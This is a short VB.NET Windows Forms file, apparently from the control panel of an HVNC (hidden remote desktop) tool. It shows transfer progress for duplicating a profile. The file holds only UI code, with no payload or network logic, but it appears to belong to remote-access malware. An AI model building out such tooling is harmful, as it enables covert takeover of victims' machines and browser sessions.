Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.Serialization.Formatters
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Windows.Forms

Namespace HVNC
	Partial Public Class FrmTransfer
		Inherits Form

		Public int_0 As Integer

		Public Property DuplicateProgesse() As ProgressBar
			Get
				Return Me.DuplicateProgess
			End Get
			Set(ByVal value As ProgressBar)
				DuplicateProgess = value
			End Set
		End Property

		Public Property FileTransferLabele() As Label
			Get
				Return Me.FileTransferLabel
			End Get
			Set(ByVal value As Label)
				FileTransferLabel = value
			End Set
		End Property

		Public Sub New()
			int_0 = 0
			InitializeComponent()
		End Sub

		Private Sub FrmTransfer_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load

		End Sub

		Public Sub DuplicateProfile(ByVal int_1 As Integer)

			If int_1 > int_0 Then
				int_1 = int_0
			End If

			FileTransferLabel.Text = Conversions.ToString(int_1) & " / " & Conversions.ToString(int_0) & " MB"


			DuplicateProgess.Value = int_1
		End Sub

	End Class
End Namespace
